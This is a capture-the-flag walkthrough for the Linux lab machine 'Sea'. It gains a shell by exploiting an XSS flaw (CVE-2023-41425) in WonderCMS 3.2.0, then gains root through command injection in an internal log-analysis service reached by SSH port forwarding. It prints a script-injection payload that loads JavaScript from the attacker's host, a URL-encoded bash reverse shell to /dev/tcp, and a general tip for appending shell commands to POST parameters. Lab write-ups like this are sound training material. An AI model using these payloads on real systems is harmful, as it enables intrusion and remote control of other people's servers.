# Sea - Walkthrough (Linux)

## 🌊 Initial Foothold

### 🌐 1. Web Enumeration
- Explored port **80**, found:
  - `/themes/bike/readme.md` → indicated CMS usage
  - `/version` → revealed **WonderCMS 3.2.0**

### 🚨 2. Exploit: CVE-2023-41425
- Found exploit: [CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425)
- This XSS-based exploit loads a malicious JS file and sends a reverse shell.

### 🛠️ 3. Setup
- Added hostname to `/etc/hosts`:
  ```bash
  echo "10.129.X.X sea.htb" | sudo tee -a /etc/hosts
  ```

- Cloned and modified the exploit:
  ```bash
  wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
  unzip main.zip
  ```

- Edited `exploit.py`:
  Replaced:
  ```js
  var urlWithoutLogBase = new URL(urlWithoutLog).pathname;
  ```
  With:
  ```js
  var urlWithoutLogBase = new URL(urlWithoutLog).host;
  ```

- Ran exploit:
  ```bash
  python3 exploit.py http://sea.htb/loginURL 10.10.16.52 9001
  ```

- Injected payload via web form (`contact.php`, website field):
  ```html
  http://sea.htb/index.php?page=loginURL?"></form><script src="http://10.10.16.52:8000/xss.js"></script><form action="
  ```

- Received reverse shell.

---

## ⚙️ Privilege Escalation

### 🔍 1. Found Local Port Listening
- Noticed service on **localhost:8080**

### 🔄 2. SSH Port Forward
- Forwarded port with SSH:
  ```bash
  ssh -L 8080:localhost:8080 user@sea.htb
  ```

- Configured **Burp Suite** to intercept `localhost:8080` requests  
  (refer to [burp port forward instructions](obsidian://open?vault=Obsidian%20Vault&file=burp%20getting%20request%20with%20port%20forward))

### 💥 3. Exploit via POST Request
- In a POST parameter (`log_file`), injected reverse shell payload:
  ```
  log_file=%2Fvar%2Flog%2Fauth.log;bash+-c+'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.52%2F80%200%3E%261'&analyze_log=
  ```

> 🧠 **Tip:**  
> If you're exploiting a POST request, you can append:
> ```
> ;bash+-c+'your_encoded_reverse_shell_command'
> ```
> This often works in command injection scenarios.

---

## ✅ Summary
- XSS in outdated WonderCMS led to shell.
- Root gained via command injection in internal service accessed with port forwarding and Burp Suite.
